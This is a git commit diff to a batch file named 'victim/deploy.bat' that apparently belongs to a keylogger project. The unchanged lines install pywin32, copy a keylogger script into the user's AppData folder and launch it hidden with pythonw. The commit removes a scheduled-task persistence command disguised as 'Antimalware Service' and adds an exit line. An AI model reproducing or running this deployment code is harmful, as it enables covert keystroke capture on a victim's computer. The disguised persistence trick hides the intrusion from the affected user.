4542d6745e9b811d133f84bb590c54706489d5a3
zxcV32 <i14a23h19a@gmail.com>
2018-07-06 14:57:50 +0530

    Update deploy.bat

--- victim/deploy.bat
+++ victim/deploy.bat
@@ -6,7 +6,6 @@ REM install 64bit pywin32
 pip3 install pywin32-223.1-cp37-cp37m-win_amd64.whl
 REM copy keylogger to writable directory without administrative privileges
 copy init2z.pyw C:\Users\%USERNAME%\AppData\Local\ /y
-REM adding entry in windows task scheduler for every logon (This step is optional). REQUIRES ADMIN COMMAND PROMPT which is already requested in hiddencmd.bat file.if no admin is given this command does not execute successfully.
-schtasks /create /tn "Antimalware Service" /tr "C:\Users\%USERNAME%\AppData\Local\Programs\Python\Python37\pythonw.exe C:\Users\%USERNAME%\AppData\Local\init2z.pyw" /F /sc ONLOGON /ru %USERNAME%
 REM executing keylogger for current session only
 C:\Users\%USERNAME%\AppData\Local\Programs\Python\Python37\pythonw.exe C:\Users\%USERNAME%\AppData\Local\init2z.pyw
+exit
